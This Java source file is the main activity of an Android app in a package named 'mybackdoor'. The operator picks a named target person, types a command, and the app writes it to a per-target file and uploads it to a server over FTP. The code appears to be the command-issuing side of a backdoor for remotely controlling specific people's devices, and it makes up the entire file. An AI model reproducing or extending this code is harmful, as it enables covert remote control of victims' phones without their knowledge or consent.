package com.speedyapps.mybackdoor;

import android.Manifest;
import android.annotation.TargetApi;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.Toast;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class theMainActivity extends AppCompatActivity {

    Spinner spinner;
    ArrayList<String> arrayList;
    ArrayAdapter<String> arrayAdapter;
    String choice;
    File myFile;
    FileWriter fileWriter;
    EditText editText;
    FTPFunctions ftpFunc;
    boolean status;
    private static final int REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS = 291;
    @RequiresApi(api = Build.VERSION_CODES.M)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_the_main);
        requestPermissionsApp();
        spinner=(Spinner)findViewById(R.id.spinner);;
        arrayList=new ArrayList<String>();
        editText = (EditText)findViewById(R.id.editText);
        arrayList.add("Vivek");
        arrayList.add("Subash");
        arrayAdapter=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,arrayList);
        spinner.setAdapter(arrayAdapter);
        ftpFunc=new FTPFunctions(this);
    }
    public void onClick(View view) throws IOException {
        choice=spinner.getSelectedItem().toString();
        switch(choice){
            case "Subash" :
                myFile = new File("/sdcard/subash.txt");
                break;
            case "Vivek":
                myFile = new File("/sdcard/vivek.txt");
                break;
            default:
                choice="null";
                Toast.makeText(this, "Please Select a Target From DropDown Menu " , Toast.LENGTH_SHORT).show();
                break;
        }
        Log.i("zz",""+choice);
        if(!choice.equals("null")) {
            if (!myFile.exists())
                try {
                    myFile.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            else {
                myFile.delete();
                try {
                    myFile.createNewFile();
                } catch (IOException e) {
                    e.printStackTrace();
                }

            }
            fileWriter= new FileWriter(myFile);
            if(!editText.getText().toString().isEmpty())
                fileWriter.write(editText.getText().toString());
            else
                Toast.makeText(this, "Enter Some Command!", Toast.LENGTH_SHORT).show();
            fileWriter.close();
            Thread t = new Thread(new Runnable() {
                @Override
                public void run() {
                    status = ftpFunc.login();
                    simpleFunc();
                }
            });
            t.start();


    }
    }
    public void simpleFunc(){
        Log.i("zz","status:"+status);
        if(status) {
            Thread t2 = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        ftpFunc.uploadFile(myFile.toString());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            });
            t2.start();
        }

        else
            Toast.makeText(this, "Error Logging In to SERVER!!!", Toast.LENGTH_SHORT).show();
    }

    @RequiresApi(api = Build.VERSION_CODES.M)
    void requestPermissionsApp(){
        List<String> permissionsNeeded = new ArrayList<String>();
        final List<String> permissionsList = new ArrayList<String>();
        permissionsList.clear();
        permissionsNeeded.clear();
        if (ContextCompat.checkSelfPermission(theMainActivity.this,Manifest.permission.READ_EXTERNAL_STORAGE)!=PackageManager.PERMISSION_GRANTED) {
            permissionsList.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            permissionsList.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            permissionsNeeded.add("Read External Storage");
            permissionsNeeded.add("Write External Storage");
        }
        if (permissionsList.size() > 0) {
            if (permissionsNeeded.size() > 0) {
                String message = "You need to grant access to " + permissionsNeeded.get(0);
                for (int i = 1; i < permissionsNeeded.size(); i++)
                    message = message + ", " + permissionsNeeded.get(i);
                showMessageOKCancel(message,
                        new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                requestPermissions(permissionsList.toArray(new String[permissionsList.size()]),REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
                            }
                        });
                return;
            }
            requestPermissions(permissionsList.toArray(new String[permissionsList.size()]), REQUEST_CODE_ASK_MULTIPLE_PERMISSIONS);
            return;
        }

        //  requestPermissionsApp();
    }
    private void showMessageOKCancel(String message, DialogInterface.OnClickListener okListener) {
        new AlertDialog.Builder(theMainActivity.this)
                .setMessage(message)
                .setPositiveButton("OK", okListener)
                .setNegativeButton("Cancel", null)
                .create()
                .show();
    }

}
